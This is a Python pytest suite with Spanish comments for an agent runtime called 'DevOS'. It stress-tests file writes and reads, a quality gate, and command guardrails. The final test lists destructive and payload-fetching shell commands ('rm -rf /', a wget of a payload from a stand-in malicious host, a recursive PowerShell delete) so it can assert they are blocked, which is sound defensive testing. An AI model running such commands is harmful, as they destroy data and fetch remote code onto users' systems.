# test_stress.py — tests/runtime/
# Suite de pruebas de estrés y rendimiento para la validación en producción del DevOS

import os
import sys
import tempfile
import shutil
import pytest
from unittest.mock import MagicMock, patch

from runtime.mcp_executor import McpExecutor
from runtime.quality_gate import QualityGate
from runtime.schemas import GateDecisionSchema
from runtime.workflow_runner import WorkflowRunner

@pytest.fixture
def temp_stress_dir():
    """Crea y limpia un directorio temporal para pruebas de estrés."""
    temp_dir = tempfile.mkdtemp(prefix="devos_stress_")
    yield temp_dir
    shutil.rmtree(temp_dir, ignore_errors=True)

def test_mass_file_io_stress(temp_stress_dir):
    """Prueba el comportamiento de McpExecutor escribiendo y leyendo 100 archivos rápidamente."""
    executor = McpExecutor(base_dir=temp_stress_dir)
    
    # Escribir 100 archivos secuencialmente
    for i in range(100):
        file_path = os.path.join(temp_stress_dir, f"stress_file_{i}.py")
        result = executor.execute_tool("write_file", {
            "path": file_path,
            "content": f"def test_func_{i}():\n    return {i}\n"
        })
        assert result["status"] == "SUCCESS", f"Failed to write file {i}"

    # Leer y verificar los 100 archivos
    for i in range(100):
        file_path = os.path.join(temp_stress_dir, f"stress_file_{i}.py")
        result = executor.execute_tool("read_file", {
            "path": file_path
        })
        assert result["status"] == "SUCCESS", f"Failed to read file {i}"
        assert f"return {i}" in result["content"]

def test_quality_gate_high_density_project(temp_stress_dir):
    """Estresa el QualityGate con un proyecto de alta densidad de archivos (50 archivos con imports cruzados)."""
    # Crear la estructura de estrés: 5 paquetes, 10 módulos por paquete
    for p in range(5):
        pkg_path = os.path.join(temp_stress_dir, f"package_{p}")
        os.makedirs(pkg_path, exist_ok=True)
        with open(os.path.join(pkg_path, "__init__.py"), "w") as f:
            f.write(f"# Init for package {p}\n")
        
        for m in range(10):
            mod_path = os.path.join(pkg_path, f"module_{m}.py")
            with open(mod_path, "w") as f:
                f.write(f"def func_{p}_{m}():\n    return 'Hello from pkg {p} mod {m}'\n\n")
                if m > 0:
                    f.write(f"from .module_{m-1} import func_{p}_{m-1}\n")

    # 1. Comprobar que falla inicialmente debido a la falta de archivos requeridos (README/requirements.txt)
    gate = QualityGate(temp_stress_dir)
    res_fail = gate.run()
    assert res_fail["status"] == "FAIL"
    assert any("MISSING_FILE" in e for e in res_fail["errors"])

    # 2. Agregar los archivos mínimos requeridos y comprobar que pasa exitosamente
    with open(os.path.join(temp_stress_dir, "README.md"), "w") as f:
        f.write("# Stress Test Project\n")
    with open(os.path.join(temp_stress_dir, "requirements.txt"), "w") as f:
        f.write("pytest\n")

    gate_success = QualityGate(temp_stress_dir)
    res_pass = gate_success.run()
    assert res_pass["status"] == "SUCCESS"
    assert res_pass["approved"] is True
    assert res_pass["score"] == 10.0
    assert res_pass["checks"]["syntax"] == "OK"
    assert res_pass["checks"]["structure"] == "OK"

def test_security_guardrails_under_load():
    """Valida que los guardrails de comandos bloqueen correctamente múltiples comandos maliciosos secuenciales."""
    executor = McpExecutor()
    malicious_commands = [
        "rm -rf /",
        "format C: /y",
        "wget http://malicious.com/payload.sh",
        "curl http://malicious-api.com",
        "sh -c 'rm -rf /'",
        "powershell.exe -Command Remove-Item -Recurse -Force /"
    ]
    
    for cmd in malicious_commands:
        res = executor.execute_tool("run_command", {"command": cmd}, agent_role="frontend-developer")
        assert res["status"] == "FAIL"
        assert "Acceso Denegado" in res["error"]
